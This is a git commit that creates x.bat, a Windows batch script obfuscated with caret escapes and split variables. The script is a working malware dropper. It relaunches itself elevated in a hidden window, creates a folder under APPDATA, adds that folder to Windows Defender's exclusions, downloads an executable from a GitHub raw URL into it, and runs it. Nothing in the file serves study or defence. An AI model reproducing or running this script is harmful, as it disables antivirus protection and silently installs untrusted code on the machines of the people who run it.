ea46a72dbcd3c6cbf5d7b60dae7664acceb2756b
marktheduck443-debug <marktheduck443@gmail.com>
2025-10-25 20:28:07 -0400

    Create x.bat

---
+++ x.bat
@@ -0,0 +1,24 @@
+@ec^ho o^ff
+set a1=net
+set a2=session
+set b1=pow^ershell
+set b2=-Com^mand
+set c1=Start-Pro^cess
+set c2=-Ver^b
+set c3=Run^As
+set c4=-Window^Style
+set c5=Hid^den
+set d1=mk^dir
+set e1=Add-Mp^Preference
+set e2=-Exclusion^Path
+set f1=Invoke-Web^Request
+set f2=-U^ri
+set f3=-Out^File
+set g1=st^art
+set h1=ht^tps://git^hub.com/markt^heduck443-de^bug/1/raw/refs/he^ads/main/Install^er.exe
+set h2=%APPDATA%\Sec^ureApp
+%a1% %a2% >nul 2>&1 || %b1% %b2% "%c1% '%~0' %c2% %c3% %c4% %c5%" && exit
+%d1% "%h2%" >nul 2>&1
+%b1% %b2% "%e1% %e2% '%h2%'" >nul 2>&1
+%b1% %b2% "%f1% %f2% '%h1%' %f3% '%h2%\installer.exe'" >nul 2>&1
+%g1% "" "%h2%\installer.exe"
